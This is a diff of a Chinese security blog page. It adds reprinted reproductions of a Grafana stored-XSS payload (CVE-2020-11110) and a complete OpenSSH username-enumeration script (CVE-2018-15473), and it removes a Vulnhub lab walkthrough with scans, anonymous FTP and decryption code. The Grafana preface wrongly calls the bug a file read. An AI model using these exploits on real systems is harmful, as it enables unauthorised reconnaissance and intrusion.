@@ -82,6 +82,106 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/19/CVE-2020-11110-Grafana/">
+                Grafana 存储型XSS漏洞（CVE-2020-11110）
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="grafana-存储型xss漏洞cve-2020-11110">Grafana 存储型XSS漏洞（CVE-2020-11110）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hi-blog/p/grafana-stored-xss-CVE-2020-11110.html">starnight_cyber</a> 并作补充</p>
+</blockquote>
+<h2><span id="preface">Preface</span></h2><blockquote>
+<p>Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。Grafana 存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过该漏洞读取主机上的任意文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CVE编号：</span><br><span class="line">    CVE-<span class="number">2020</span>-<span class="number">11110</span></span><br><span class="line">影响范围：</span><br><span class="line">    Grafana v6<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">Links</span><br><span class="line">    https://ctf-writeup.revers3c.com/challenges/web/CVE-<span class="number">2020</span>-<span class="number">11110</span>/index.html</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="复现记录">复现记录</span></h2><h3><span id="测试环境部署">测试环境部署</span></h3><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =&gt; </span><br><span class="line">&#123;&quot;dashboard&quot;:&#123;&quot;annotations&quot;:&#123;&quot;list&quot;:[&#123;&quot;name&quot;:&quot;Annotations &amp; Alerts&quot;,&quot;enable&quot;:true,&quot;iconColor&quot;:&quot;rgba(0, 211, 255, 1)&quot;,&quot;type&quot;:&quot;dashboard&quot;,&quot;builtIn&quot;:1,&quot;hide&quot;:true&#125;]&#125;,&quot;editable&quot;:true,&quot;gnetId&quot;:null,&quot;graphTooltip&quot;:0,&quot;id&quot;:null,&quot;links&quot;:[],&quot;panels&quot;:[],&quot;schemaVersion&quot;:18,&quot;snapshot&quot;:&#123;&quot;originalUrl&quot;:&quot;javascript:alert(&#x27;Revers3c&#x27;)&quot;,&quot;timestamp&quot;:&quot;2020-03-30T01:24:44.529Z&quot;&#125;,&quot;style&quot;:&quot;dark&quot;,&quot;tags&quot;:[],&quot;templating&quot;:&#123;&quot;list&quot;:[]&#125;,&quot;time&quot;:&#123;&quot;from&quot;:null,&quot;to&quot;:&quot;2020-03-30T01:24:53.549Z&quot;,&quot;raw&quot;:&#123;&quot;from&quot;:&quot;6h&quot;,&quot;to&quot;:&quot;now&quot;&#125;&#125;,&quot;timepicker&quot;:&#123;&quot;refresh_intervals&quot;:[&quot;5s&quot;,&quot;10s&quot;,&quot;30s&quot;,&quot;1m&quot;,&quot;5m&quot;,&quot;15m&quot;,&quot;30m&quot;,&quot;1h&quot;,&quot;2h&quot;,&quot;1d&quot;],&quot;time_options&quot;:[&quot;5m&quot;,&quot;15m&quot;,&quot;1h&quot;,&quot;6h&quot;,&quot;12h&quot;,&quot;24h&quot;,&quot;2d&quot;,&quot;7d&quot;,&quot;30d&quot;]&#125;,&quot;timezone&quot;:&quot;&quot;,&quot;title&quot;:&quot;Dashboard&quot;,&quot;uid&quot;:null,&quot;version&quot;:0&#125;,&quot;name&quot;:&quot;Dashboard&quot;,&quot;expires&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/CVE-2020-11110-Grafana/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="stored-xss">Stored-XSS</span></h3><blockquote>
+<p>替换 url 中的 localhost，访问快照地址，点击链接🔗图标。 Stored-XSS。</p>
+<p><img src="/2024/01/19/CVE-2020-11110-Grafana/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="snapshot-快照删除">snapshot 快照删除</span></h3><blockquote>
+<p>访问 deleteUrl：</p>
+<p><a target="_blank" rel="noopener" href="http://103.210.162.186:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ">http://103.210.xx.xx:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ</a></p>
+<p><img src="/2024/01/19/CVE-2020-11110-Grafana/3.png" alt="image"></p>
+<p>可以删除 snapshot，这里算是个严重程度更高的漏洞。</p>
+</blockquote>
+<h2><span id="修复方案">修复方案</span></h2><blockquote>
+<p>版本升级。</p>
+</blockquote>
+<h2><span id="refer">Refer</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html">https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html</a></p>
+<p>以上！</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Grafana/" rel="tag">Grafana</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XSS/" rel="tag">XSS</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2024/01/19/CVE-2018-15473-OpenSSH/">
+                OpenSSH用户名枚举及其检测方法（CVE-2018-15473）
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="openssh用户名枚举及其检测方法cve-2018-15473">OpenSSH用户名枚举及其检测方法（CVE-2018-15473）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/726a3791b5b9">testerzhang</a> 并作补充</p>
+<p>OpenSSH 7.7前在接收到畸形的认证请求包时，会根据用户名的存在与否给出不同的响应，由此导致通过SSH服务枚举服务器的用户名。</p>
+</blockquote>
+<h3><span id="ssh-check-usernamepy-使用说明">ssh-check-username.py 使用说明</span></h3><blockquote>
+<ul>
+<li>安装依赖包 <code>pip install paramiko==2.0.8</code></li>
+<li>语法：<code>python ssh_checkusername.py ip username –port 22</code></li>
+</ul>
+</blockquote>
+<h3><span id="脚本">脚本</span></h3><blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Copyright (c) 2018 Matthew Daley</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Permission is hereby granted, free of charge, to any person obtaining a copy</span></span><br><span class="line"><span class="comment"># of this software and associated documentation files (the &quot;Software&quot;), to</span></span><br><span class="line"><span class="comment"># deal in the Software without restriction, including without limitation the</span></span><br><span class="line"><span class="comment"># rights to use, copy, modify, merge, publish, distribute, sublicense, and/or</span></span><br><span class="line"><span class="comment"># sell copies of the Software, and to permit persons to whom the Software is</span></span><br><span class="line"><span class="comment"># furnished to do so, subject to the following conditions:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># The above copyright notice and this permission notice shall be included in</span></span><br><span class="line"><span class="comment"># all copies or substantial portions of the Software.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># THE SOFTWARE IS PROVIDED &quot;AS IS&quot;, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR</span></span><br><span class="line"><span class="comment"># IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,</span></span><br><span class="line"><span class="comment"># FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE</span></span><br><span class="line"><span class="comment"># AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER</span></span><br><span class="line"><span class="comment"># LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING</span></span><br><span class="line"><span class="comment"># FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS</span></span><br><span class="line"><span class="comment"># IN THE SOFTWARE.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">InvalidUsername</span>(<span class="title class_ inherited__">Exception</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_boolean</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">old_service_accept = paramiko.auth_handler.AuthHandler._handler_table[</span><br><span class="line">        paramiko.common.MSG_SERVICE_ACCEPT]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service_accept</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    paramiko.message.Message.add_boolean = add_boolean</span><br><span class="line">    <span class="keyword">return</span> old_service_accept(*args, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">userauth_failure</span>(<span class="params">*args, **kwargs</span>):</span><br><span class="line">    <span class="keyword">raise</span> InvalidUsername()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">paramiko.auth_handler.AuthHandler._handler_table.update(&#123;</span><br><span class="line">    paramiko.common.MSG_SERVICE_ACCEPT: service_accept,</span><br><span class="line">    paramiko.common.MSG_USERAUTH_FAILURE: userauth_failure</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">&#x27;paramiko.transport&#x27;</span>).addHandler(logging.NullHandler())</span><br><span class="line"></span><br><span class="line">arg_parser = argparse.ArgumentParser()</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;hostname&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--port&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">22</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;username&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>)</span><br><span class="line">args = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line">sock = socket.socket()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sock.connect((args.hostname, args.port))</span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to connect&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">transport = paramiko.transport.Transport(sock)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.start_client()</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.SSHException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[-] Failed to negotiate SSH transport&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    transport.auth_publickey(args.username, paramiko.RSAKey.generate(<span class="number">2048</span>))</span><br><span class="line"><span class="keyword">except</span> InvalidUsername:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[*] Invalid username&#x27;</span></span><br><span class="line">    sys.exit(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">except</span> paramiko.ssh_exception.AuthenticationException:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+] Valid username&#x27;</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="验证说明">验证说明：</span></h2><blockquote>
+<p>如果服务器存在的用户，则脚本会返回<code>Valid username</code></p>
+<p>如果服务器不存在的用户，则脚本会返回<code>Invalid username</code><br> 如果升级ssh版本之后：</p>
+<p>如果服务器存在的用户，则脚本会返回<code>Valid username</code></p>
+<p>如果服务器不存在的用户，则脚本会返回<code>Valid username</code></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/OpenSSH/" rel="tag">OpenSSH</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/19/MQTT-Pwd/">
                 MQTT未授权漏洞利用
             </a>
@@ -921,173 +1021,6 @@
         
             <div class="tags">
                 <a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/Warzone/" rel="tag">Warzone</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
-            </div>
-        
-
-    </section>
-</article>
-  
-    <article class="post ">
-
-    
-        <h2 class="title">
-            <a href="/2023/12/11/Warzone-1/">
-                WARZONE 1
-            </a>
-        </h2>
-    
-    <time>
-        Dec 11, 2023
-    </time>
-    <section class="content">
-        <h1><span id="warzone-1">WARZONE: 1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
-<h4><span id="名称warzone-1">名称：Warzone: 1</span></h4><h4><span id="发布日期20201024">发布日期：2020.10.24</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列warzone">系列：Warzone</span></h4><h4><span id="推特-al1enum">推特: @AL1ENUM</span></h4></blockquote>
-<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
-<h4><span id="flags">Flags：</span></h4><p>captain:&#x2F;~&#x2F;Desktop&#x2F;user.txt<br>root:&#x2F;root&#x2F;Desktop&#x2F;root.txt </p>
-<h4><span id="难度中等">难度：中等</span></h4></blockquote>
-<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
-<h4><span id="文件名warzoneova">文件名：Warzone.ova</span></h4><h4><span id="文件大小22gb">文件大小：2.2GB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomwarzonewarzoneova">下载地址：</span></h4><h4><span id="md5-98fc0985c32a2380a0afbf24222c22d5">MD5: 98FC0985C32A2380A0AFBF24222C22D5</span></h4><h4><span id="sha1-0fb9dbc8d8516b462c4e1c8735d41b01d57f2b35">SHA1: 0FB9DBC8D8516B462C4E1C8735D41B01D57F2B35</span></h4></blockquote>
-<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
-<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
-<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
-<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
-<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
-<p>1.将靶机warzone1和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
-<p><img src="/2023/12/11/Warzone-1/1.png" alt="image"></p>
-</blockquote>
-<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
-<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/2.png" alt="image"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/3.png" alt="image"></p>
-<p>2.再进行端口扫描，发现开放了21，22和5000端口，访问5000端口，发现栅栏密码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.128 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/4.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-1/5.png" alt="image"></p>
-<p>3.最后再进行一下目录扫描，没有太多值得关注的信息：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;gobuster dir -u http://192.168.56.128:5000 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/6.png" alt="image"></p>
-</blockquote>
-<h3><span id="页面信息获取">页面信息获取</span></h3><blockquote>
-<p>1.栅栏密码的原文应该是Its a warzone，加密后变成Iwotaaznsre，将源码中的字串解密（<a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=777%EF%BC%89%E5%BE%97%E5%88%B0%E8%B7%AF%E5%BE%84%EF%BC%9A">http://www.atoolbox.net/Tool.php?Id=777）得到路径：</a></p>
-<p><img src="/2023/12/11/Warzone-1/7.png" alt="image"></p>
-<p>2.访问页面路径，得到8个用户及对应密码加密，加密字段无法用base64直接解开：</p>
-<p><img src="/2023/12/11/Warzone-1/8.png" alt="image"></p>
-</blockquote>
-<h3><span id="ftp匿名登录">FTP匿名登录</span></h3><blockquote>
-<p>1.来到21端口，我们发现ftp服务可匿名登录：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.128</span><br><span class="line">anonymous</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/9.png" alt="image"></p>
-<p>2.在&#x2F;pub目录下我们能发现note.txt，提示我们密码都是用warzone-encrypt.jar进行加密的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd pub</span><br><span class="line">ls -la</span><br><span class="line">get note.txt</span><br><span class="line">get warzone-encrypt.jar</span><br><span class="line">quit</span><br><span class="line">cat note.txt</span><br></pre></td></tr></table></figure>
-<p><img src="/2023/12/11/Warzone-1/10.png" alt="image"></p>
-<p><img src="/2023/12/11/Warzone-1/11.png" alt="image"></p>
-</blockquote>
-<h3><span id="jar加密算法反解">jar加密算法反解</span></h3><blockquote>
-<p>1.查看warzone-encrypt.jar，发现是用AES对密码进行加密的，这样的话我们依加密算法写出解密算法即可：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Main.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> encrypt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"><span class="keyword">import</span> Other.Obfuscated;</span><br><span class="line"><span class="keyword">import</span> crypto.AES;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">decrypt</span><span class="params">(String encryptpasswd)</span> &#123;</span><br><span class="line">       <span class="type">Obfuscated</span> <span class="variable">obs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Obfuscated</span>();</span><br><span class="line">       <span class="type">AES</span> <span class="variable">ea</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AES</span>(obs.getIV(), <span class="number">128</span>, obs.getKey());</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           ea.cipher.init(<span class="number">2</span>, ea.key, ea.iv);</span><br><span class="line">           <span class="type">byte</span>[] encryptbytes = Base64.getDecoder().decode(encryptpasswd);</span><br><span class="line">           <span class="type">byte</span>[] decryptbytes = ea.cipher.doFinal(encryptbytes);</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(decryptbytes);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(ex.getMessage());</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">       <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">           <span class="type">Scanner</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">           System.out.print(<span class="string">&quot;enter the encryptpassword to decrypt : &quot;</span>);</span><br><span class="line">           <span class="type">String</span> <span class="variable">encryptpassword</span> <span class="operator">=</span> in.nextLine();</span><br><span class="line">           System.out.println(<span class="string">&quot;password : &quot;</span> + decrypt(encryptpassword));</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">AES.java</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> crypto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Other.Obfuscated;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.MessageDigest;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.IvParameterSpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AES</span> &#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">IvParameterSpec</span> <span class="variable">DEFAULT_IV</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">19</span>]);</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ALGORITHM</span> <span class="operator">=</span> <span class="string">&quot;AES&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TRANSFORMATION</span> <span class="operator">=</span> <span class="string">&quot;AES/CBC/PKCS5Padding&quot;</span>;</span><br><span class="line"> <span class="keyword">public</span> Key key;</span><br><span class="line"> <span class="keyword">public</span> IvParameterSpec iv;</span><br><span class="line"> <span class="keyword">public</span> Cipher cipher;</span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">AES</span><span class="params">(String key)</span> &#123;</span><br><span class="line">   <span class="built_in">this</span>(key, <span class="number">128</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">AES</span><span class="params">(String key, <span class="type">int</span> bit)</span> &#123;</span><br><span class="line">   <span class="built_in">this</span>(key, bit, <span class="literal">null</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">public</span> <span class="title function_">AES</span><span class="params">(String key, <span class="type">int</span> bit, String iv)</span> &#123;</span><br><span class="line">   <span class="keyword">if</span> (bit == <span class="number">256</span>) &#123;</span><br><span class="line">     <span class="built_in">this</span>.key = <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(getHash(<span class="string">&quot;SHA-256&quot;</span>, key), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="built_in">this</span>.key = <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(getHash(<span class="string">&quot;MD5&quot;</span>, key), <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">   &#125; </span><br><span class="line">   <span class="keyword">if</span> (iv != <span class="literal">null</span>) &#123;</span><br><span class="line">     <span class="built_in">this</span>.iv = <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(getHash(<span class="string">&quot;MD5&quot;</span>, iv));</span><br><span class="line">   &#125; <span class="keyword">else</span> 